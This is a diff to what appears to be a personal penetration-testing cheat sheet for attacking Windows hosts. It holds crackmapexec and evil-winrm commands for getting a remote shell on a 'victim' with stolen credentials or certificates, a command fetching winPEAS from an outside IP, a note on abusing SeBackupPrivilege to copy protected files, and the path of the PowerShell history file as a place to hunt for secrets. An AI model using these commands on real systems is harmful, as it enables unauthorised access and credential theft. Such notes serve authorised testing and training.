@@ -51,6 +51,9 @@
 - connecting to victim get full shell for memory inject / other nasty shit
 - Check if vulnable ``` crackmapexec winrm {ip} -u {username} -p "{password}" -d {domain} ```
 - ``` evil-winrm -i {ip} -u {username not service name} -p "{password}" ```
+### evil-winrm (Secured)
+- ``` evil-winrm -S -i {host} -c {key.cert} -k {key.pem} ```
+
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
   
@@ -202,3 +205,7 @@
 1. SeBackupPrivilege (disabled) still can hack!
     - https://github.com/giuliano108/SeBackupPrivilege 
     - after enabled then copy the file out and read 
+2. Interesting file
+   ```
+   1. c:\users\{name}\APPDATA\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt
+   ```
